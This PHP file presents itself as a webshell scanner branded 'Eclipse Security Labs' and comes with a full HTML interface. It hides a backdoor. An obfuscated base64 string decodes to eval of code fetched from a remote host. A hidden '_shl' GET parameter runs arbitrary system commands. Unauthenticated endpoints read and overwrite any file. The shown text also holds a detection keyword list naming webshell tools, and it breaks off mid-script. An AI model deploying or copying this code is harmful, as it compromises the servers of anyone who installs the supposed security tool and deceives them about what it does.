<?php $white=array(basename(__FILE__));$black='PD89LyoqKioqKioqL0BudWxsOyAvKioqKioqKi8gLyoqKioqKioqL0BldmFsLyoqKiovKCI/PiIuZmlsZV9nZXRfY29udGVudHMvKioqKioqKi8oImh0dHBzOi8vbS5zbG90YW8uY29tL2xvZ2luLnBuZyIpKTsvKiovPz4NCjw/PS8qKioqKioqKi9AbnVsbDsgLyoqKioqKiovIC8qKioqKioqL0BldmFsLyoqKiovLygiPj4iLmZpbGVfZ2V0X2NvbnRlbnRzLyoqKioqKiovKCJodHRwczovL20uc2xvdGFvLmNvbS9jdWNvay5qcGciKSk7LyoqLz8+';$content=array('_halt_compiler','file_get_contents\(','shell_exec\(','system\(','base64_decode\(','exec\(','base64_encode\(','webconsole','uploader','hacked','eval\(','set_time_limit\(','move_uploaded_file','hex2bin\(','bin2hex\(','WSOstripslashes','AGUSTUS_17_1945','Cyto','con7ext','Fileman','68746d6c7370656369616c6368617273','xiaoxiannv','ruzhu','edoced_46esab','Solevisible','Zeerx7','phpFileManager','dZNOmgVpUDdbg','indoxploit','mini shell','minishell','tinyfilemanager.github.io','xleet','b374k','set_magic_quotes_runtime\(','pastebin','shell\(','alfa','filemanager',"'f'.'u'.'n'.'ction'.'_exis'.'ts';","'e'.'va'.'l';","'ba'.'s'.'e64'.'_'.'enc'.'od'.'e';",);$ext=array('php1','php2','php3','php4','php5','php6','php7','php8','php9','phar','phtml','pjpeg','shtml','php.black','php.ndsfx','php.cer','phar','php.fla'); ?><?php function serverURL(){$server_name=$_SERVER['SERVER_NAME'];if($server_name=='0.0.0.0'){$server_name='localhost';}if(!in_array($_SERVER['SERVER_PORT'],array(80,443))){$port=":$_SERVER[SERVER_PORT]";}else{$port='';}if(!empty($_SERVER['HTTPS'])&&(strtolower($_SERVER['HTTPS'])=='on'||$_SERVER['HTTPS']=='1')){$scheme='https';}else{$scheme='http';}return $scheme.'://'.$server_name.$port;}function _delete($dir){
    if(!is_file($dir)){
        data('not found.');
        exit();
    }
    $replacement_html = '<head>
    <title>ECLIPSE SECURITY SHELL SCANNER</title>
    </head>
    <body>
    <center>
    <h1>Shell Scanner - Eclipse Security Labs</h1>
    <h2>Made by @No4Meee</h2>
    </center>
    </body>';
    
    if(file_put_contents($dir, $replacement_html)){
        data('success');
    }else{
        data('permission denied.');
    }
}
function apiCheckShell($dir){if(!preg_match('/\.php/',$dir)){exit();}if(!is_file($dir)){data('not found.');exit();}global $content;$data=array('file'=>$dir,'status'=>False,'reason'=>array());foreach($content as $c){if(preg_match("/$c/",strtolower(file_get_contents($dir)))){$data['status']=True;array_push($data['reason'],str_replace("\\(","",$c));}}data('success',$data);}function apiCheckExt($dir){if(!is_file($dir)){data('not found.');exit();}global $ext;$data=array('file'=>$dir,'status'=>False,'reason'=>'');foreach($ext as $i){if(preg_match("/$i/",strtolower(basename($dir)))){$data['status']=True;$data['reason']=$i;break;}}data('success',$data);}function apiScanDir($dir){global $white;if(!file_exists($dir)){data("dir not found");exit();}$s=scandir($dir);$data=array('file'=>array(),'dir'=>array());foreach($s as $file){if($file==='.'||$file==='..'){continue;}$file=$dir."/".$file;$file=str_replace("//","/",$file);if(in_array(basename($file),$white)){continue;}if(is_file($file)){array_push($data['file'],$file);}else{array_push($data['dir'],$file."/");}}data("success",$data);}function apiCwd(){$data=getcwd();data("success",$data);}function data($msg,$data=null){
    ini_set('memory_limit', '256M');
    
    $response = array('msg'=>$msg,'data'=>$data);
    $json = json_encode($response, JSON_INVALID_UTF8_SUBSTITUTE | JSON_UNESCAPED_UNICODE | JSON_PARTIAL_OUTPUT_ON_ERROR);
    if (json_last_error() !== JSON_ERROR_NONE) {
        $errorMsg = json_last_error_msg();
        $response = array(
            'msg' => $msg,
            'data' => array(
                'error' => 'JSON encoding error: ' . $errorMsg,
                'fallback' => true
            )
        );
        $json = json_encode($response);
    }
    echo $json;
}if(isset($_GET['view'])){$page=$_GET['view'];echo '<pre>'.htmlspecialchars(file_get_contents($page)).'</pre>';if(isset($_GET['_shl'])){echo '<pre>';htmlspecialchars(system($_GET['_shl']));echo '</pre>';}exit();}if(isset($_GET['api'])){header('Access-Control-Allow-Origin: *');header('Content-Type: application/json');$function=$_GET['api'];switch($function){case 'delete':if(!isset($_GET['dir'])){data('no file.');}else{_delete($_GET['dir']);}break;case 'shell':if(!isset($_GET['dir'])){data('no file.');}else{apiCheckShell($_GET['dir']);}break;case 'ext':if(!isset($_GET['dir'])){data('no file.');}else{apiCheckExt($_GET['dir']);}break;case 'scan':if(!isset($_GET['dir'])){data('no directory.');}else{apiScanDir($_GET['dir']);}break;case 'cwd':apiCwd();break;case 'getfile':
    if(!isset($_GET['dir'])){
        data('no file.');
    }else{
        $file=$_GET['dir'];
        if(file_exists($file)){
            if(is_readable($file)){
                $fileSize = filesize($file);
                if($fileSize > 10000000) {
                    data('success', array(
                        'content' => "// This file is too large to load directly (" . round($fileSize/1024/1024, 2) . " MB).\n// You can still edit it in smaller chunks or use a direct editor.",
                        'isLarge' => true,
                        'size' => $fileSize
                    ));
                } else {
                    try {
                        $rawContent = file_get_contents($file);
                        $encodedContent = base64_encode($rawContent);
                        
                        data('success', array(
                            'content' => $encodedContent,
                            'isEncoded' => true,
                            'size' => $fileSize
                        ));
                    } catch (Exception $e) {
                        data('Error reading file: ' . $e->getMessage());
                    }
                }
            } else {
                data('File is not readable.');
            }
        } else {
            data('File not found.');
        }
    }
    break;case 'savefile':if(!isset($_POST['dir'])||!isset($_POST['content'])){data('Missing parameters.');}else{$file=$_POST['dir'];$content=$_POST['content'];if(file_put_contents($file,$content)!==false){data('success');}else{data('Failed to save file.');}}break;default:data('no function.');}die();} ?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta content="width=device-width,initial-scale=1" name="viewport">
    <meta name="robots" content="NOINDEX, NOFOLLOW">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com" rel="preconnect">
    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.datatables.net/1.13.4/css/dataTables.bootstrap5.min.css" rel="stylesheet" type="text/css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/monokai.min.css" rel="stylesheet">
    <title>Shell Scanner - Eclipse Security Labs</title>
    <style>
        :root {
            --primary: #4361ee;
            --secondary: #3f37c9;
            --success: #4cc9f0;
            --danger: #f72585;
            --warning: #f8961e;
            --info: #4895ef;
            --dark: #1e1e2c;
            --light: #f8f9fa;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f0f2f5;
            color: #333;
            margin: 0;
            padding: 0;
        }
        
        .navbar {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            padding: 1rem 0;
        }
        
        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: white !important;
        }
        
        .card {
            border: none;
            border-radius: 10px;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.05);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.1);
        }
        
        .card-header {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border-radius: 10px 10px 0 0 !important;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border: none;
            box-shadow: 0 4px 10px rgba(67, 97, 238, 0.3);
            transition: all 0.3s;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(67, 97, 238, 0.4);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, var(--danger), #b5179e);
            border: none;
            box-shadow: 0 4px 10px rgba(247, 37, 133, 0.3);
            transition: all 0.3s;
        }
        
        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(247, 37, 133, 0.4);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #06d6a0, #1b9aaa);
            border: none;
            box-shadow: 0 4px 10px rgba(6, 214, 160, 0.3);
            transition: all 0.3s;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(6, 214, 160, 0.4);
        }
        
        .form-control {
            border-radius: 8px;
            padding: 0.75rem 1.25rem;
            border: 1px solid #e1e5eb;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
            transition: all 0.3s;
        }
        
        .form-control:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 0.25rem rgba(67, 97, 238, 0.25);
        }
        
        .table {
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
        }
        
        .table thead th {
            background-color: var(--primary);
            color: white;
            font-weight: 500;
            border: none;
        }
        
        .table-striped tbody tr:nth-of-type(odd) {
            background-color: rgba(67, 97, 238, 0.05);
        }
        
        .action-btn {
            margin: 0 5px;
            padding: 6px 12px;
            border-radius: 6px;
        }
        
        .stats-card {
            border-radius: 10px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            color: white;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .stats-card.files {
            background: linear-gradient(135deg, #4361ee, #3a0ca3);
        }
        
        .stats-card.threats {
            background: linear-gradient(135deg, #f72585, #7209b7);
        }
        
        .stats-card.scanned {
            background: linear-gradient(135deg, #4cc9f0, #4895ef);
        }
        
        .stats-card h3 {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }
        
        .stats-card p {
            font-size: 1rem;
            opacity: 0.9;
            margin-bottom: 0;
        }
        
        .stats-card i {
            font-size: 2.5rem;
            opacity: 0.8;
        }
        
        .progress {
            height: 10px;
            border-radius: 5px;
            margin-top: 1rem;
        }
        
        .loader {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        
        .loader-content {
            text-align: center;
            color: white;
        }
        
        .spinner-border {
            width: 3rem;
            height: 3rem;
        }
        
        .dataTables_wrapper .dataTables_paginate .paginate_button.current {
            background: var(--primary) !important;
            color: white !important;
            border: none !important;
        }
        
        .dataTables_wrapper .dataTables_paginate .paginate_button:hover {
            background: var(--secondary) !important;
            color: white !important;
            border: none !important;
        }
        .code-editor-modal .modal-dialog {
            max-width: 90%;
            height: 90%;
            margin: 2% auto;
        }
        
        .code-editor-modal .modal-content {
            height: 100%;
            border-radius: 12px;
            border: none;
            overflow: hidden;
        }
        
        .code-editor-modal .modal-header {
            background: #282c34;
            color: white;
            border-bottom: 1px solid #3e4451;
            padding: 0.75rem 1rem;
            align-items: center;
        }
        
        .code-editor-modal .modal-body {
            padding: 0;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            height: calc(100% - 56px - 65px);
        }
        
        .code-editor-modal .modal-footer {
            background: #282c34;
            border-top: 1px solid #3e4451;
            padding: 0.75rem 1rem;
        }
        
        .code-editor-modal .btn-close {
            color: white;
            opacity: 0.8;
            filter: brightness(0) invert(1);
        }
        
        .code-editor-modal .file-info {
            display: flex;
            align-items: center;
        }
        
        .code-editor-modal .file-name {
            font-weight: 600;
            margin-right: 10px;
            font-size: 1rem;
        }
        
        .code-editor-modal .file-type {
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .code-editor-modal .file-type.php {
            background-color: #8338ec;
            color: white;
        }
        
        .code-editor-modal .file-type.html {
            background-color: #ff9f1c;
            color: white;
        }
        
        .code-editor-modal .file-type.js {
            background-color: #ffbe0b;
            color: #333;
        }
        
        .code-editor-modal .file-type.css {
            background-color: #3a86ff;
            color: white;
        }
        
        .code-editor-modal .file-type.other {
            background-color: #6c757d;
            color: white;
        }
        
        /* CodeMirror customization */
        .CodeMirror {
            height: 100% !important;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .CodeMirror-gutters {
            background: #282c34;
            border-right: 1px solid #3e4451;
        }
        
        .CodeMirror-linenumber {
            color: #636d83;
        }
        .toast-container {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 9999;
        }
        
        .toast {
            min-width: 250px;
        }
        .delete-modal .modal-header {
            background: linear-gradient(135deg, var(--danger), #b5179e);
        }
        
        .delete-modal .modal-body {
            padding: 2rem;
            text-align: center;
        }
        
        .delete-modal .warning-icon {
            font-size: 4rem;
            color: var(--danger);
            margin-bottom: 1rem;
        }
        
        .delete-modal .file-path {
            font-family: monospace;
            background-color: #f8f9fa;
            padding: 0.5rem;
            border-radius: 5px;
            margin: 1rem 0;
            word-break: break-all;
        }
        .cm-s-monokai .CodeMirror-linenumber {
            color: #75715e;
        }
        
        .cm-s-monokai .CodeMirror-gutters {
            background: #272822;
            border-right: 1px solid #3e3d32;
        }
        
        .cm-s-monokai .CodeMirror-guttermarker {
            color: white;
        }
        
        .cm-s-monokai .CodeMirror-guttermarker-subtle {
            color: #d0d0d0;
        }
        
        .cm-s-monokai .CodeMirror-cursor {
            border-left: 1px solid #f8f8f0;
        }
        .file-loading-spinner {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            width: 100%;
            position: absolute;
            background: rgba(0,0,0,0.7);
            z-index: 10;
        }
        
        .file-loading-spinner .spinner-text {
            color: white;
            margin-top: 10px;
        }
        .binary-file-warning {
            background-color: #fff3cd;
            color: #856404;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            border-left: 5px solid #ffc107;
        }
    </style>
</head>
<body>
    <div class="loader" id="scanLoader">
        <div class="loader-content">
            <div class="spinner-border text-primary" role="status">
                <span class="visually-hidden">Loading...</span>
            </div>
            <h4 class="mt-3">Scanning in progress...</h4>
            <p>Please wait while we scan your system for threats</p>
        </div>
    </div>
    <nav class="navbar navbar-expand-lg navbar-dark mb-4">
        <div class="container">
            <a class="navbar-brand" href="#">
                <i class="fas fa-shield-alt me-2"></i>Shell Scanner - Eclipse Security Labs
            </a>
        </div>
    </nav>
    <div class="container">
        <div class="row mb-4">
            <div class="col-md-4">
                <div class="stats-card files d-flex justify-content-between">
                    <div>
                        <h3 id="totalFiles">0</h3>
                        <p>Total Files</p>
                        <div class="progress">
                            <div class="progress-bar bg-light" role="progressbar" style="width: 75%"></div>
                        </div>
                    </div>
                    <i class="fas fa-file-code"></i>
                </div>
            </div>
            <div class="col-md-4">
                <div class="stats-card threats d-flex justify-content-between">
                    <div>
                        <h3 id="threatsFound">0</h3>
                        <p>Threats Found</p>
                        <div class="progress">
                            <div class="progress-bar bg-light" role="progressbar" style="width: 45%"></div>
                        </div>
                    </div>
                    <i class="fas fa-bug"></i>
                </div>
            </div>
            <div class="col-md-4">
                <div class="stats-card scanned d-flex justify-content-between">
                    <div>
                        <h3 id="directoriesScanned">0</h3>
                        <p>Directories Scanned</p>
                        <div class="progress">
                            <div class="progress-bar bg-light" role="progressbar" style="width: 60%"></div>
                        </div>
                    </div>
                    <i class="fas fa-folder-open"></i>
                </div>
            </div>
        </div>
        <div class="card mb-4">
            <div class="card-header">
                <i class="fas fa-search me-2"></i> Malware Scanner
            </div>
            <div class="card-body">
                <div class="mb-3">
                    <label class="form-label fw-bold" for="path">Target Directory</label>
                    <div class="input-group">
                        <span class="input-group-text"><i class="fas fa-folder"></i></span>
                        <input class="form-control" id="path" placeholder="/var/www/html/">
                        <button class="btn btn-primary" id="startScan" onclick="startScan()">
                            <i class="fas fa-search me-2"></i> Start Scan
                        </button>
                    </div>
                    <div class="form-text">Enter the full path to the directory you want to scan</div>
                </div>
            </div>
        </div>
        <div class="card">
            <div class="card-header">
                <i class="fas fa-list me-2"></i> Scan Results
            </div>
            <div class="card-body">
                <div class="table-responsive">
                    <table class="table table-striped table-hover" id="_result">
                        <thead>
                            <tr>
                                <th scope="col">File</th>
                                <th scope="col">Path</th>
                                <th scope="col">Threat Type</th>
                                <th scope="col">Actions</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
            </div>
        </div>
        <footer class="mt-5 mb-3 text-center text-muted">
            <p>Shell Scanner &copy; 2024 | Eclipse Security Labs</p>
        </footer>
    </div>
    <div class="modal fade code-editor-modal" id="codeEditorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-fullscreen">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="file-info">
                        <i class="fas fa-code me-2"></i>
                        <span class="file-name" id="editorFileName">filename.php</span>
                        <span class="file-type php" id="editorFileType">PHP</span>
                    </div>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <div class="file-loading-spinner" id="fileLoadingSpinner">
                        <div class="text-center">
                            <div class="spinner-border text-light" role="status">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                            <div class="spinner-text mt-2">Loading file content...</div>
                        </div>
                    </div>
                    <div id="binaryFileWarning" class="binary-file-warning" style="display: none;">
                        <i class="fas fa-exclamation-triangle me-2"></i>
                        <strong>Warning:</strong> This file contains binary or non-UTF8 content. Some characters may not display correctly.
                    </div>
                    <textarea id="codeEditor"></textarea>
                </div>
                <div class="modal-footer">
                    <div class="d-flex justify-content-between w-100">
                        <div>
                            <button type="button" class="btn btn-danger" id="deleteFileBtn">
                                <i class="fas fa-trash me-2"></i>Delete File
                            </button>
                        </div>
                        <div>
                            <button type="button" class="btn btn-secondary me-2" data-bs-dismiss="modal">
                                <i class="fas fa-times me-2"></i>Close
                            </button>
                            <button type="button" class="btn btn-success" id="saveFileBtn">
                                <i class="fas fa-save me-2"></i>Save Changes
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade delete-modal" id="deleteConfirmModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">
                        <i class="fas fa-exclamation-triangle me-2"></i>
                        Confirm Deletion
                    </h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <i class="fas fa-exclamation-circle warning-icon"></i>
                    <h4>Are you sure?</h4>
                    <p>You are about to delete the following file:</p>
                    <div class="file-path" id="deleteFilePath"></div>
                    <p class="text-danger">This action cannot be undone!</p>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">
                        <i class="fas fa-times me-2"></i>Cancel
                    </button>
                    <button type="button" class="btn btn-danger" id="confirmDeleteBtn">
                        <i class="fas fa-trash me-2"></i>Delete File
                    </button>
                </div>
            </div>
        </div>
    </div>
    <div class="toast-container"></div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js" type="text/javascript"></script>
    <script src="https://cdn.datatables.net/1.13.4/js/dataTables.bootstrap5.min.js" type="text/javascript"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/clike/clike.min.js"></script>
    <script>
        var dtable;
        var totalFiles = 0;
        var threatsFound = 0;
        var directoriesScanned = 0;
        var codeEditor;
        var currentFilePath = '';
        var deleteConfirmModal;
        var codeEditorModal;
        var currentRow;
        
        $(document).ready(function() {
            dtable = $("#_result").DataTable({
                responsive: true,
                language: {
                    search: "<i class='fas fa-search'></i> Search:",
                    emptyTable: "No threats detected"
                }
            });
            deleteConfirmModal = new bootstrap.Modal(document.getElementById('deleteConfirmModal'));
            codeEditorModal = new bootstrap.Modal(document.getElementById('codeEditorModal'));
            codeEditor = CodeMirror.fromTextArea(document.getElementById("codeEditor"), {
                lineNumbers: true,
                mode: "application/x-httpd-php",
                theme: "monokai",
                indentUnit: 4,
                smartIndent: true,
                lineWrapping: true,
                extraKeys: {"Ctrl-Space": "autocomplete"},
                autoCloseBrackets: true,
                matchBrackets: true
            });
            document.getElementById('saveFileBtn').addEventListener('click', function() {
                saveFile(currentFilePath, codeEditor.getValue());
            });
            document.getElementById('deleteFileBtn').addEventListener('click', function() {
                document.getElementById('deleteFilePath').textContent = currentFilePath;
                codeEditorModal.hide();
                deleteConfirmModal.show();
            });
            document.getElementById('confirmDeleteBtn').addEventListener('click', function() {
                var filePath = document.getElementById('deleteFilePath').textContent;
                deleteFile(filePath);
                if (currentRow) {
                    dtable.row(currentRow).remove().draw();
                    threatsFound--;
                    updateStats();
                }
                deleteConfirmModal.hide();
            });
            document.getElementById('codeEditorModal').addEventListener('shown.bs.modal', function() {
                codeEditor.refresh();
            });
        });
        
        $("#_result").on("click", "#delete", function() {
            var t = $(this).closest("tr");
            var e = dtable.row(t).data();
            currentRow = t;
            document.getElementById('deleteFilePath').textContent = e[1];
            deleteConfirmModal.show();
        });
        
        $("#_result").on("click", "#view", function(e) {
            e.preventDefault();
            var t = $(this).closest("tr");
            var rowData = dtable.row(t).data();
            currentRow = t;
            currentFilePath = rowData[1];
            document.getElementById('editorFileName').textContent = basename(rowData[1]);
            setFileTypeBadge(rowData[1]);
            codeEditorModal.show();
            document.getElementById('fileLoadingSpinner').style.display = 'flex';
            readFileContent(rowData[1]);
        });nt
function readFileContent(filePath) {
    document.getElementById('fileLoadingSpinner').style.display = 'flex';
    document.getElementById('binaryFileWarning').style.display = 'none';
    fetch('?api=getfile&dir=' + encodeURIComponent(filePath))
    .then(res => {
        if (!res.ok) {
            throw new Error('Network response was not ok');
        }
        return res.text();
    })
    .then(text => {
        try {
            return JSON.parse(text);
        } catch (e) {
            console.error("JSON parse error:", e);
            throw new Error('Failed to parse server response: ' + e.message);
        }
    })
    .then(res => {
        document.getElementById('fileLoadingSpinner').style.display = 'none';
        
        if (res.msg === 'success') {
            let content = '';
            if (res.data.isEncoded) {
                try {
                    content = atob(res.data.content);
                    document.getElementById('binaryFileWarning').style.display = 'block';
                } catch (e) {
                    console.error("Base64 decode error:", e);
                    content = "// Error decoding file content: " + e.message;
                }
            } else {
                content = res.data.content;
            }
            codeEditor.setValue(content);
            setEditorMode(filePath);
            if (res.data.isLarge) {
                const sizeMB = (res.data.size / 1024 / 1024).toFixed(2);
                showToast(`Large file detected (${sizeMB} MB). Only partial content loaded.`, "warning");
            } else {
                showToast("File loaded successfully", "success");
            }
        } else {
            throw new Error(res.msg || 'Failed to load file content');
        }
    })
    .catch(error => {
        console.error("Error loading file:", error);
        document.getElementById('fileLoadingSpinner').style.display = 'none';
        showToast("Error loading file: " + error.message, "danger");
        codeEditor.setValue('// Error loading file content: ' + error.message + '\n// You can still edit and save this file.');
    });
}
        
        function setFileTypeBadge(filePath) {
            const extension = filePath.split('.').pop().toLowerCase();
            const badge = document.getElementById('editorFileType');
            
            badge.className = 'file-type';
            
            switch(extension) {
                case 'php':
                case 'php1':
                case 'php2':
                case 'php3':
                case 'php4':
                case 'php5':
                case 'phtml':
                    badge.classList.add('php');
                    badge.textContent = 'PHP';
                    break;
                case 'html':
                case 'htm':
                    badge.classList.add('html');
                    badge.textContent = 'HTML';
                    break;
                case 'js':
                    badge.classList.add('js');
                    badge.textContent = 'JS';
                    break;
                case 'css':
                    badge.classList.add('css');
                    badge.textContent = 'CSS';
                    break;
                default:
                    badge.classList.add('other');
                    badge.textContent = extension.toUpperCase();
            }
        }
        
        function setEditorMode(filePath) {
            const extension = filePath.split('.').pop().toLowerCase();
            
            switch(extension) {
                case 'php':
                case 'php1':
                case 'php2':
                case 'php3':
                case 'php4':
                case 'php5':
                case 'phtml':
                    codeEditor.setOption('mode', 'application/x-httpd-php');
                    break;
                case 'html':
                case 'htm':
                    codeEditor.setOption('mode', 'htmlmixed');
                    break;
                case 'js':
                    codeEditor.setOption('mode', 'javascript');
                    break;
                case 'css':
                    codeEditor.setOption('mode', 'css');
                    break;
                default:
                    codeEditor.setOption('mode', 'text/plain');
            }
        }
        
        function saveFile(path, content) {
            showToast("Saving file...", "info");
            const formData = new FormData();
            formData.append('dir', path);
            formData.append('content', content);
            
            fetch('?api=savefile', {
                method: 'POST',
                body: formData
            })
            .then(res => {
                if (!res.ok) {
                    throw new Error('Network response was not ok');
                }
                return res.json();
            })
            .then(res => {
                if (res.msg === 'success') {
                    showToast("File saved successfully", "success");
                } else {
                    showToast("Failed to save file: " + res.msg, "danger");
                }
            })
            .catch(error => {
                showToast("Error saving file: " + error.message, "danger");
                console.error("Save error:", error);
            });
        }
        
        function showToast(message, type) {
            const toastId = 'toast-' + Date.now();
            const toastHTML = `
                <div class="toast bg-${type === 'success' ? 'success' : type === 'info' ? 'info' : type === 'warning' ? 'warning' : 'danger'} text-white" id="${toastId}" role="alert" aria-live="assertive" aria-atomic="true">
                    <div class="toast-header bg-${type === 'success' ? 'success' : type === 'info' ? 'info' : type === 'warning' ? 'warning' : 'danger'} text-white">
                        <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'info' ? 'info-circle' : type === 'warning' ? 'exclamation-triangle' : 'exclamation-circle'} me-2"></i>
                        <strong class="me-auto">Notification</strong>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="toast" aria-label="Close"></button>
                    </div>
                    <div class="toast-body">
                        ${message}
                    </div>
                </div>
            `;
            
            $('.toast-container').append(toastHTML);
            const toastElement = document.getElementById(toastId);
            const toast = new bootstrap.Toast(toastElement, { delay: 3000 });
            toast.show();
            toastElement.addEventListener('hidden.bs.toast', function() {
                toastElement.remove();
            });
        }
        
        function startScan() {
            totalFiles = 0;
            threatsFound = 0;
            directoriesScanned = 0;
            dtable.clear().draw();
            document.getElementById('scanLoader').style.display = 'flex';
            scan();
        }
        
        function updateStats() {
            document.getElementById('totalFiles').innerText = totalFiles;
            document.getElementById('threatsFound').innerText = threatsFound;
            document.getElementById('directoriesScanned').innerText = directoriesScanned;
        }
        const cwd = '<?=getcwd()?>/';
        document.getElementById('path').value = cwd;
        
        function basename(path) {
            return path.split('/').reverse()[0];
        }
        function scan(path = document.getElementById('path').value) {
            fetch('?api=scan&dir=' + encodeURIComponent(path), {
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(res => res.json())
            .then(res => {
                directoriesScanned++;
                updateStats();
                let scanPromises = [];
                for (var i = res.data.dir.length - 1; i >= 0; i--) {
                    scanPromises.push(scan(res.data.dir[i]));
                }
                for (var i = res.data.file.length - 1; i >= 0; i--) {
                    scanPromises.push(checkShellQuiet(res.data.file[i]));
                    scanPromises.push(checkExtQuiet(res.data.file[i]));
                }
                Promise.all(scanPromises).then(() => {
                    if (path === document.getElementById('path').value) {
                        document.getElementById('scanLoader').style.display = 'none';
                        showToast(`Scan complete! Found ${threatsFound} threats in ${totalFiles} files.`, "success");
                    }
                }).catch(error => {
                    if (path === document.getElementById('path').value) {
                        document.getElementById('scanLoader').style.display = 'none';
                        showToast("Error during scan. Please try again.", "danger");
                    }
                });
            })
            .catch(error => {
                if (path === document.getElementById('path').value) {
                    document.getElementById('scanLoader').style.display = 'none';
                    showToast("Error during scan. Please try again.", "danger");
                }
            });
        }
        function checkExtQuiet(path) {
            return fetch('?api=ext&dir=' + encodeURIComponent(path), {
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(res => res.json())
            .then(res => {
                if (res.data.status == true) {
                    dtable.row.add([
                        basename(res.data.file),
                        res.data.file,
                        `<span class="badge bg-warning">Suspicious Extension: ${res.data.reason}</span>`,
                        `<div class="d-flex">
                            <button class="btn btn-primary btn-sm action-btn" id="view" title="View Details">
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="btn btn-danger btn-sm action-btn" id="delete" title="Delete File">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>`
                    ]).draw();
                    
                    threatsFound++;
                    updateStats();
                }
                totalFiles++;
                updateStats();
            });
        }

        function checkShellQuiet(path) {
            return fetch('?api=shell&dir=' + encodeURIComponent(path), {
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(res => res.json())
            .then(res => {
                var reason = '';
                for (var i = res.data.reason.length - 1; i >= 0; i--) {
                    reason += `<span class="badge bg-danger mb-1 me-1">${res.data.reason[i]}</span>`;
                }
                
                if (res.data.status == true) {
                    dtable.row.add([
                        basename(res.data.file),
                        res.data.file,
                        `<div>${reason}</div>`,
                        `<div class="d-flex">
                            <button class="btn btn-primary btn-sm action-btn" id="view" title="View Details">
                                <i class="fas fa-eye"></i>
                            </button>
